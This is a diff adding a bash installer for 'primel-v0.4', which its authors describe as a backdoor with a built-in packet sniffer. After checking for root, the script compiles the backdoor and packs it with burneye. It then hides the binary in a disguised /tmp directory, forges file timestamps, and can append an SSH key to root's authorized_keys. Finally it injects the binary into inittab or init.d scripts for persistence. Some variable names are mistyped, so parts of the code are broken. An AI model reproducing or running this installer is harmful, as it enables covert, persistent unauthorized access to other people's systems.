@@ -1,0 +1,285 @@
+#!/bin/bash
+
+# install file for primel-v0.4
+# an non listen backdoor with builtin packet sniffer
+# made by posidron and Rushjo
+# www.tripbit.org
+
+echo -e "\n\t   install primel-v0.4     \n\t   -------------------
+\n\tmade by posidron and Rushjo\n\t     www.tripbit.org       \n\n\n"
+
+
+
+# setup part - change settings only here
+#
+
+SOURCEFILE=primel.c								# Name of the source file
+FILENAME=primel									# Name of the compiled file
+COMPRESSEDFILENAME=primelcomp							# Name of the compressed file with burneye
+BURNEYE=YES									# Burneye actived = YES & Burneye not actived = NO
+WORKINGDIRECTORY=`pwd`								# Gets the working directory
+TARGETDIRECTORY=/tmp/.psst/".."							# Directory where to hide the compiled file
+SSH=NO										# ssh actived = YES & ssh not actived = NO
+SSH_PORT=5010									# SSH Port
+SSH_USER=r00t	 								# User for ssh login
+SSH_PASSWORD=w00t									# Password for ssh login
+STARTSCRIPT1=inittab								# Name of start script to start the backdoor
+STARTSCRIPT2=hostname								# Name of start script to start the backdoor
+STARTSCRIPT3=rcS								# Name of start script to start the backdoor
+PATHTOSCRIPT1=/etc								# Path to Script1
+PATHTOSCRIPT2=/etc/init.d							# Path to Script2
+PATHTOSCRIPT3=/etc/init.d							# Path to Script3
+NUMBEROFLINES_SCRIPT1=`cat $PATHTOSCRIPT1/$STARTSCRIPT1 |wc -l`			# Total Numbers of Lines
+NUMBEROFLINES_SCRIPT2=`cat $PATHTOSCRIPT2/$STARTSCRIPT2 |wc -l`			# Total Number of Lines
+NUMBEROFLINES_SCRIPT3=`cat $PATHTOSCRIPT3/$STARTSCRIPT3 |wc -l`			# Total Number of Lines
+LASTLINE_SCRIPT1=`more +$NUMBEROFLINES_SCRIPT1 $PATHTOSCRIPT1/$STARTSCRIPT1`	# Content of Last Line of Script
+LASTLINE_SCRIPT2=`more +$NUMBEROFLINES_SCRIPT2 $PATHTOSCRIPT2/$STARTSCRIPT2`	# Content of Last Line of Script
+LASTLINE_SCRIPT3=`more +$NUMBEROFLINES_SCRIPT3 $PATHTOSCRIPT3/$STARTSCRIPT3`	# Content of Last Line of Script
+ROOT_UID=0									# Only User with $UID=0 have root privilges
+ERROR_FILENOTFOUND=66								# File not found
+ERROR_NOTROOT=67								# Non-root exit error.
+
+
+
+# ---------------------------------------------------
+# hopefully nothing to change below this line! ;)
+# ---------------------------------------------------
+
+
+# Testing the defined settings
+#
+
+
+echo -n "Checking SOURCEFILE NAME: "
+if [ -n "$SOURCEFILE" ]
+then
+	echo -e "\t \t \t ok"
+else
+	echo -e "\t \t \t no"
+ 	echo "Name of the Source File not defined!"
+ 	exit 0					# exit because of this misconfiguration
+fi
+
+echo -n "Checking FILENAME: "
+if [ -n "$FILENAME" ]
+then
+	echo -e "\t \t \t \t ok"
+else
+	echo -e "\t \t \t \t no"
+	echo "Name of the compiled File not defined!"
+ 	exit 0					# exit because of this misconfiguration
+fi
+
+echo -n "Checking TARGETDIRECTORY: "
+if [ -n "$TARGETDIRECTORY" ]
+then
+	echo -e "\t \t \t ok"
+else
+	echo -e "\t \t \t no"
+	echo "Name of the Target Directory not defined!"
+	exit 0					# exit because of this misconfiguration
+fi
+
+echo -n "Using SSH: "
+if [ "$SSH" == YES ];then
+	echo -e "\t \t \t \t \t ok"
+	echo -n "Checking SSH User name: "
+	if [ -n "$SSH_USER" ];then
+		echo -e "\t \t \t ok"
+	else
+		echo -e "\t \t \t no"
+		echo "SSH User name not defined!"
+		exit 0				# exit because of this misconfiguration
+	fi
+
+	echo -n "Checking SSH Password: "
+	if [ -n "$SSH_PASSWORD" ];then
+		echo -e "\t \t \t \t ok"
+	else
+		echo -e "\t \t \t \t no"
+		echo "SSH Password not defined!"
+		exit 0 				# exit because of this misconfiguration
+	fi
+fi
+echo -e "\t \t \t \t \t no"
+
+echo -n "Checking STARTSCRIPT1: "
+if [ -n "$STARTSCRIPT1" ];then
+	echo -e "\t \t \t \t ok"
+	echo -n "Checking STARTSCRIPT2: "
+	if [ -n "$STARTSCRIPT2" ];then
+		echo -e "\t \t \t \t ok"
+		echo -n "Checking STARTSCRIPT3: "
+		if [ -n "$STARTSCRIPT3" ];then
+			echo -e "\t \t \t \t ok"
+		else
+			echo -e "\t \t \t \t no"
+			echo "STARTSCRIPT3 not defined!"
+			exit 0
+		fi
+	else
+		echo -e "\t \t \t \t no"
+		echo "STARTSCRIPT2 not defined!"
+		exit 0
+	fi
+else
+	echo -e "\t \t \t \t no"
+	echo "STARTSCRIPT1 not defined!"
+	exit 0									# exit because of this misconfiguration
+fi
+echo
+
+
+
+# Run as root, of course.
+#
+
+echo -n "Checking ROOT_UID: "
+if [ "$UID" -ne "$ROOT_UID" ]
+then
+	echo -e "\t \t \t \t no"
+	echo "Must be root to run this script."
+	exit $ERROR_NOTROOT
+fi
+echo -e "\t \t \t \t ok"
+echo
+echo "Yeah, I'm r00t. I love this game...."
+echo
+
+
+# compiling the source
+#
+
+echo -n "Compiling the Source: "
+if [ -f "$WORKINGDIRECTORY/$SOURCEFILE" ];then
+	gcc "$WORKINGDIRECTORY/$SOURCEFILENAME" -o "$WORKINGDIRECTORY/$FILE" -Wall >> /dev/null 2>&1
+	echo -e "\t \t \t \t ok"
+else
+	echo -e "\t \t \t \t no"
+	exit $ERROR_FILENOTFOUND
+fi
+
+
+
+# compressing file with burneye
+#
+
+echo -n "Using Burneye: "
+if [ $BURNEYE == YES ];then
+	if [ -x $WORKINGDIRECTORY/burneye ];then
+		burneye -p "justansecret" -o "$COMPRESSEDFILENAME" "$FILENAME" >> /dev/null 2>&1
+		echo -e "\t \t \t \t \t ok"
+	else
+		unset BURNEYE
+		BURNEYE=NO
+		echo -e "\t \t \t \t \t no"
+	fi
+else
+	echo -e "\t \t \t \t \t no"
+fi
+
+
+
+# changing file mode to read (r) and execute (x) only for owner
+#
+
+echo -n "Changing Modus of File: "
+if [ $BURNEYE == YES ]
+then
+	chmod u+rx "$WORKINGDIRECTORY/$COMPRESSEDFILENAME"
+else
+	chmod u+rx "$WORKINGDIRECTORY/$FILENAME"
+fi
+echo -e "\t \t \t ok"
+
+
+
+# move compiled file to target directory
+#
+
+echo -n "Creating the Target Directory: "
+mkdir -p $TARGETDIRECTORY
+touch -r /etc/init.d $TARGETDIRECTORY
+echo -e "\t \t \t ok"
+
+echo -n "Moving compiled file to Target Directory: "
+if [ $BURNEYE == YES ]
+then
+	mv -f "$WORKINGDIRECTORY/$COMPRESSEDFILENAME" "$TARGETDIRECTORY"
+	chattr -saui "$TARGETDIRECTORY/$COMPRESSEDFILENAME"
+	touch -r /etc/init.d "$TARGETDIRECTORY/$COMPRESSEDFILENAME"
+else
+	mv -f "$WORKINGDIRECTORY/$FILENAME" "$TARGETDIRECTORY"
+	chattr -saui "$TARGETDIRECTORY/$FILENAME"
+	touch -r /etc/init.d "$TARGETDIRECTORY/COMPRESSEDFILENAME"
+fi
+echo -e "\t ok"
+
+# Creating SSH Accounts
+#
+
+if [ $SSH == YES ];then
+	echo -n "Creating SSH Accounts: "
+	if [ ! -f /usr/sbin/sshd ];then
+		echo -e "\t \t \t no"
+	else
+		mkdir -p "$TARGETDIRECTORY/.ssh"
+		ssh-keygen -q -b 1024 -f "$TARGETDIRECTORY/.ssh/key" -t rsa -N "$SSH_PASSWORD"
+   		echo -e "\t \t \t ok"
+		cat STARGETDIRECTORY/.ssh/key.pub >> /root/.ssh/authorized_keys
+		echo -n "You can find your ssh_id_dsa_key at this location: $TARGETDIRECTORY/.ssh/ "
+		echo -n "Keep them carefully! \n"
+		echo -n "Creating your special SSHD Config File: \n"
+		echo -n "#PermitRootLogin yes"
+		echo -n "#StrictModes yes \n"
+		echo -n "#RSAAuthentication yes"
+		echo -n "#PasswordAuthentication no"
+                echo -n "#PermitEmptyPasswords no"
+ 		echo "
+		echo -n "Creating SSHD PID: "
+		echo "$TARGETDIRECTORY/.ssh/pid"
+		echo -e "\t \t \t ok"
+	fi
+fi
+
+# Install the backdoor to an beautyful script
+#
+
+echo -n "Backpacking backdoor to an start script: "
+if [ -f $PATHTOSCRIPT1/$STARTSCRIPT1 ];then
+	cat $PATHTOSCRIPT1/$STARTSCRIPT1 |grep -v "$LASTLINE_SCRIPT1" > $STARTSCRIPT1
+	if [ $BURNEYE == YES ];then
+		echo "n6::once:$TARGETDIRECTORY/$COMPRESSEDFILENAME" >> $STARTSCRIPT1
+	else
+		echo "n6::once:$TARGETDIRECTORY/$FILENAME" >> $STARTSCRIPT1
+	fi
+	echo $LASTLINE_SCRIPT1 >> $STARTSCRIPT1
+else
+	if [ -f $PATHTOSCRIPT2/$STARTSCRIPT2 ];then
+		cat $PATHTOSCRIPT2/$STARTSCRIPT2 |grep -v "$LASTLINE_SCRIPT2" > $STARTSCRIPT2
+		if [ $BURNEYE == YES ];then
+			echo $TARGETDIRECTORY/$COMPRESSEDFILENAME >> $STARTSCRIPT2
+		else
+			echo $TARGETDIRECTORY/$FILENAME >> $STARTSCRIPT2
+		fi
+		echo $LASTLINE_SCRIPT2 >> $STARTSCRIPT2
+	else
+		if [ -f $PATHTOSCRIPT3/$STARTSCRIPT3 ];then
+			cat $PATHTOSCRIPT3/$STARTSCRIPT3 |grep -v "$LASTLINE_SCRIPT3" > $STARTSCRIPT3
+			if [ $BURNEYE == YES ];then
+				echo $TARGETDIRECTORY/$COMPRESSEDFILENAME >> $STARTSCRIPT3
+			else
+				echo $TARGETDIRECTORY/$FILENAME >> $STARTSCRIPT3
+			fi
+			echo $LASTLINE_SCRIPT3 >> $STARTSCRIPT3
+		fi
+	fi
+fi
+echo -e "\t ok"
+
+
+# Cleaning up the room
+#
+
+
+#
